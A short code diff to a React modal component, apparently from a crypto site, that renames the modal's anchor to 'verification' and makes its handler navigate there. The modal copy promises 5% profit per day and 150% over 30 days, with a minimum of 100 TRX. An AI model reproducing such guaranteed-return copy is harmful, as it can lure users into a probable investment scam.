@@ -4,12 +4,12 @@ import Link from "next/link";
 import React from "react";
 
 export const handleWalletVerification = (account: ReturnType<typeof useAccount>) => {
-
+	window.location.href = "#verification";
 };
 
 export const WalletVerificationModal = () => {
 	return (
-		<div id="boost" className="modal">
+		<div id="verification" className="modal">
 			<div className="modal-dialog">
 				<div className="modal-content">
 					<div className="modal-header">
@@ -20,7 +20,7 @@ export const WalletVerificationModal = () => {
 						<span
 							className="modal-info">The investment profitability is 5% per day and 150% for 30 days.</span>
 						<div className="modal-calc">
-							
+
 						</div>
 
 						<span className="modal-minimum-boost">Minimum amount: 100 TRX</span>
